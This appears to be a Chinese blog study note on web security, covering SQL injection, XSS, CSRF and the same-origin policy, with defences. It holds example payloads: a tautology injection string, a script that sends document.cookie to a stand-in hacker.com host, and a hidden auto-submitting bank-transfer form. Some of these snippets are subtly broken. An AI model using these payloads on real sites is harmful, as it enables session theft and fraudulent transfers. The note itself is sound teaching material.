---
title: Web安全
date: 2019-02-16 17:57:46
category: Other
---
> 浏览器安全可以分为三大块——Web 页面安全、浏览器网络安全和浏览器系统安全。
### 1. sql注入
通过把sql命令插入到web表单提交，或输入域名/页面请求的查询字符串，最终达到欺骗服务器执行恶意sql命令。

变量id是一个从用户界面传来的值
```sql
string sql = " SELECT id, name, age from users WHERE id='" + id + "'"
```
ID值: *`1' OR '1' = '1`*
```sql
SELECT id, name, age
FROM users
WHERE id='1' OR '1' = '1'
```
从users表中的所有数据都查询出来，仅仅通过一个简单的恒真表达式。




### 2. XSS脚本攻击
黑客通过"HTML注入"篡改网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。

#### 2.1 如何注入恶意脚本
一旦你浏览已经被黑客留下XSS script的页面，这段js就会执行，cookie信息就会被偷走。黑客可以假冒你的身份做事情了。

如果页面被注入恶意js脚本，可以做：
- 窃听cookie：通过`document.cookie`获取cookie信息，发送给恶意服务器
- 监听用户行为：通过`addEventListener`监听键盘时间，发送给恶意服务器
- 修改DOM：伪造假的登录窗口，欺骗用户的用户名和密码
- 在页面内生成浮窗广告


将一段恶意JS代码提交到数据库，用户请求包含恶意js脚本的数据，并注入页面。

某个黑客发表了一篇文章，在`<input>`框中输入一段script
```js
<script type="text/javascript" src="http://hacker.com/hack.js"></script>
```

hack.js文件中的内容
```js
var img = document.createElement('img');
img.src = "http://hacker.com/log?" + escape(document.cookie);
document.body.appendChild(script);
```

#### 2.2 如何阻止攻击
- 对关键字符转码
```js
// 转码前
code:<script>alert('你被xss攻击了')</script>

// 转码后
code:&lt;script&gt;alert(&#39;你被xss攻击了&#39;)&lt;/script&gt;
```
- 用`HttpOnly`保护`Cookie`的安全
- 禁止执行内联脚本
- 限制加载其他域下的资源




### 3. CSRF跨站脚本伪造
#### 3.1 CSRF攻击行为
黑客引诱用户打开黑客的网站，利用用户的登录状态发起跨站请求。
- 自动发起GET请求
- 自动发起POST请求
- 引诱用户点击链接

假设有个银行网站用以下方式进行转账操作
```
http://www.bank.com/transfer.php?toBankId=<账号>&money=<金额>
```
你打开浏览器，先登录了银行网站，然后又开了一个tab页，打开了你的邮箱，有这么一个邮件：恭喜你获得了一台iphone x,点击领取。点击了上面的链接，就执行了转账操作。

后来银行转账功能不用`get`， 改用`post`。 

黑客也做了改进，建立了一个偷偷提交数据的页面。用户进入该页面，会自动提交表单。若用户已经登录了`www.bank.com`，请求成功。

从头到尾，攻击网站都没有获取到过cookie， 都是通过浏览器间接实现（利用web的cookie隐式身份验证机制），所以`httpOnly`并不会影响这个攻击。

```html
<body>
  <iframe name="steal" display:'none'>
    <form method="POST" name="transfer" action="http://www.bank.com/transfer.php">
      <input type="hidden" name="toBankId" value="123">
      <input type="hidden" name="money" value="10000">
    </form>
  </iframe>
  <script>
    function steal(){
      iframe = document.frames["steal"];
      iframe.document.submit("transfer");
    }
  </script>
</body>
```


#### 3.2 防止CSRF攻击
- 如果是第三方站点发起的请求，禁止发送某些关键Cookie数据到服务器
`Set-cookie`请求头带上`SameSite`: Strict, Lax, None
- 检查Referer, Origin请求头: 根据地址判断是否接受请求
- CSRF Token: 在浏览器向服务器发起请求时，服务器生成一个 CSRF Token，该字符串植入到返回的页面中。如果要发起转账，就要带上CSRF Token





### 4. 同源策略
如果两个 URL 的协议、域名和端口都相同，我们就称这两个 URL 同源。
- DOM层面
限制了来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作。
- 数据层面
限制了不同源的站点读取当前站点的 Cookie、IndexDB、LocalStorage 等数据。
- 网络层面
限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同源的站点。

但同时：
- 页面中可以嵌入第三方资源
- CSP & CORS: 让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码。




### 5. https

### 参考资料
- [简单的 web 安全 checklist](https://cloud.tencent.com/developer/article/1004895)
- 码农翻身-web安全
- 《图解HTTP》第11章 Web的攻击技术